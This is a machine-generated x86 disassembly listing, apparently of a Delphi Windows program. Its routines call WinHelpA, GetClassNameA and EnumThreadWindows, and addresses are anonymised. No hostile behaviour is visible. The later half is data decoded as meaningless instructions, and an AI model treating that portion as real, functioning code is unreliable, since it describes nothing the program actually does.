lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4041fc
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4041b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443024
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044e4
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_443038
push ebx
mov ebx eax
mov eax ebx
call sub_443368
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405b04
sub_443074
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4430db
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_442f68
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4430e2
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4430ec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443174
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_443060
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044e4
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44317b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_443187
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44320f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4438ac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443216
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_443194
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44320f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4438ac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443216
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_4431b7
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_442f68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443216
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44321c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443314
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_442f68
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409098
mov eax ebx
call sub_4438ac
test al al
je r-xdata
mov ecx sub_442dbc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44331b
lea eax [ ebp - 0x1c ]
call sub_404164
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_442f68
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_443804
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4041b8
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404624
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443384
push ebx
mov ebx eax
mov eax ebx
call sub_443368
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405b04
pop ebx
retn
mov eax rw-data
call sub_405b04
sub_4433b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44340c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443413
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_442f68
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_44341c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443512
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_409058
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_442f68
mov eax ebx
call sub_4438ac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443519
lea eax [ ebp - 0x110 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4043d4
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_443804
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4043d4
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443530
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443592
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443599
lea eax [ ebp - 0x8 ]
call sub_404164
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442f68
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4435a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443624
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_442f68
mov eax ebx
call sub_4438ac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44362b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_443804
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443634
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_44371f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4438ac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443726
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404188
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408350
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_443804
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408350
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_4041b8
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_442f68
mov eax [ ebp - 0x14 ]
call sub_404624
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_443734
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408ad0
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_44378f
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408aac
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_443804
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_44387a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_4437e8
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443881
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4080e0
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_443890
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4438ac
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_4437e8
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_44388c
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_443890
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_443908
sub_443908
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_443985
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_443368
call GetTickCount
mov ebx eax
push 0x0
call sub_406678
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_442f68
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44398c
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443994
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4036b4
call sub_405b1c
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4439dc
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_443a08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443a76
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a7d
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405b04
mov eax rw-data
call sub_405b04
mov eax rw-data
call sub_405b04
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_405b04
mov eax [ rw-data ]
call sub_443038
sub_443a80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443ad2
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443ad9
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_443994
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405b04
mov edx eax
mov eax [ rw-data ]
call sub_42ac94
sub_443adc
loopne r-xdata
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax ] dl
cmp eax [ eax + eax + 0x6 ]
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
outsd
insb
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor eax [ eax ]
pop eax
xor eax [ eax ]
mov al 0x63
inc esp
add ah dh
outsd
insd
add [ ebx ] cl
push esp
inc esp
jb r-xdata
sbb [ ebp + 0x44 ] ah
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add [ eax ] dl
inc esp
or al 0x65
inc esp
je r-xdata
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 8 + 0x3b ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 4 + 0x3b ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
cld
cmp al [ eax + eax + 0x1 ]
pop es
push esp
inc ebx
jne r-xdata
inc esp
add al dh
inc esp
add ah dh
arpl [ eax + eax + 0x58 ] ax
arpl [ eax + eax - 0x48 ] ax
arpl [ eax + eax + 0xc ] ax
inc esp
inc eax
add [ eax + 0x443b ] bh
add [ eax ] al
add [ eax + 0x65 ] ch
inc esp
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax - 0xbffbb9d ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ ebx ]
inc esp
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x78004035 ] bl
inc esp
jae r-xdata
add [ eax ] bl
inc esp
inc esp
add [ 0x65100044 ] cl
inc esp
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ ebp + edi + 0x44 ] cl
add [ eax ] al
inc esp
jb r-xdata
add [ eax ] bl
inc esp
add al bl
inc esp
add [ eax + 0x16004465 ] cl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
cmp eax [ eax + eax + 0x34 ]
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x65780040
inc esp
jb r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
adc [ esp + eax * 2 ] bh
add [ eax + 0x78004035 ] bl
inc esp
add [ eax + 0x65 ] ch
inc esp
add [ eax ] al
dec esp
cmp eax r--data
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x65 ] ch
inc esp
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] al
inc esp
add ah dh
inc esp
add al dh
inc esp
add ah dh
arpl [ eax + eax - 0x54 ] ax
inc esp
add [ eax + 0xc004463 ] bh
inc esp
add [ eax ] dl
inc esp
add [ ebx + 0x443c5cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c00443c ] cl
add [ eax ] al
add [ ebx + edi + 0x44 ] ch
add [ eax + 0x78004035 ] bl
inc esp
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
adc al 0x3b
inc esp
add [ ebx ] al
push es
push esp
inc ecx
inc esp
add [ eax + ebp * 2 + 0x44 ] bh
add al dh
inc esp
add ah dh
arpl [ eax + eax + 0x34 ] ax
inc esp
add [ eax + 0xc004463 ] bh
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ esi + 0x44 ] bh
add al bl
inc esp
add [ eax + 0x14004465 ] cl
push esp
inc esp
jb r-xdata
add [ eax + 0x66 ] dl
inc esp
add ah dh
arpl [ eax + eax - 0x54 ] ax
inc esp
add [ eax + 0x5c004463 ] bh
inc sp
add [ eax ] dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x54 ] si
cmp eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ r--data ]
add [ eax ] al
aam 0x3c
inc esp
add [ eax + 0x78004035 ] bl
inc esp
add [ esi + 0x35ac0044 ] bl
inc eax
add [ eax + 0x4035 ] ah
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] al
inc esp
add [ eax ] bh
inc sp
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x5c ] si
cmp al 0x44
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
inc esp
add [ eax + 0x78004035 ] bl
inc esp
add [ eax - 0x53ffbb98 ] dl
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi ] al
inc esp
add [ esi ] al
inc esp
add [ eax + ebp * 2 + 0x44 ] bh
add al dh
inc esp
add ah dh
arpl [ eax + eax + 0x34 ] ax
inc esp
add [ eax + 0xc004463 ] bh
inc esp
add [ eax ] dl
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 4 + 0x3e ] si
inc esp
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edi + 0x3e ] si
inc esp
add [ eax + 0x443c ] ah
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] dl
inc esp
add [ eax ] bl
inc esp
add [ eax - 0x5fffbb99 ] dl
inc sp
add al bl
inc esp
add [ eax + ebp * 2 + 0x44 ] dl
add [ eax + 0x68 ] ch
inc esp
add [ eax + 0xf004468 ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
cmp al 0x3e
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e ] bh
inc esp
add [ eax ] dh
add [ eax ] al
adc [ esp + eax * 2 ] bh
add [ eax + 0x78004035 ] bl
inc esp
add [ eax + 0x65 ] ch
inc esp
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi ] al
inc esp
add [ esi ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] al
inc esp
add [ eax ] bh
inc sp
mov al [ 0x4035 ]
inc esp
jb r-xdata
inc ecx
add [ esi + ecx * 4 + 0x52c80041 ] dh
inc edx
add [ edx + edx * 2 + 0x7a8c0042 ] dh
inc esp
add [ esi ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
pushfd
aas
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
aas
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi + 0x640044 ] dh
add [ eax ] al
add [ edi ] ch
add [ eax ] bl
inc esp
add [ eax - 0x5fffbb99 ] dl
inc sp
add al bl
inc esp
add [ eax + ebp * 2 + 0x44 ] dl
add [ eax + 0x68 ] ch
inc esp
add [ eax + 0x11004468 ] cl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax + 0x4035 ] ah
inc ebx
outsd
outsb
je r-xdata
xor eax 0x33000040
inc eax
add [ ebx + esi ] bl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x443f00c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi ] bh
inc esp
add [ eax ] dh
add [ eax ] al
add [ eax + 0x66 ] dl
inc esp
add ah dh
arpl [ eax + eax - 0x54 ] ax
inc esp
add [ eax + 0x5c004463 ] bh
inc sp
add [ eax ] dl
inc esp
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 2 + 0x3c ] si
inc esp
add al ch
cmp eax [ eax + eax ]
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bh
push esi
inc ebp
add [ eax ] bh
jg r-xdata
add [ eax + 0x1a ] cl
inc edx
add [ edi + edi * 2 + 0x19980044 ] bl
inc edx
inc eax
add al ah
sbb [ edx ] eax
sar [ esp + eax * 2 ] 0x1
adc al 0x1a
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
jae r-xdata
add [ esi + 0x44 ] bh
add al bl
inc esp
add [ eax + 0x12004465 ] cl
push esp
inc esp
jb r-xdata
inc esp
outsd
insb
jae r-xdata
inc edx
jne r-xdata
add [ eax + 0x56 ] al
inc ebp
add [ eax + eax * 4 + 0x44 ] cl
add [ eax + eax * 4 ] ch
inc esp
add [ eax + eax * 4 + 0x44 ] ch
add [ eax + 0x7f ] bl
inc esp
add [ esi + edx * 2 + 0x45 ] dl
add [ eax + 0x56 ] bl
inc ebp
add [ edi + edi * 2 + 0x44 ] bh
add ah ch
jl r-xdata
add [ ebp + edx * 2 + 0x45 ] bh
add [ eax + 0x7e ] dl
inc esp
add [ ebp + edx * 2 + 0x55b80045 ] ah
inc ebp
add al cl
jg r-xdata
inc edx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x7a ] ah
inc esp
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
mov ah 0x8e
inc ecx
add al cl
push edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x443f 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x3f
inc esp
add [ eax + eax ] ah
enter 0x443f 0x0
pop es
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x3d200040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jb r-xdata
je r-xdata
insd
bound ecx [ ebp + 0x69 ]
insb
or [ gs : ebx + 0x6f ] al
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ esi + edi * 2 + 0x55f40044 ] al
inc ebp
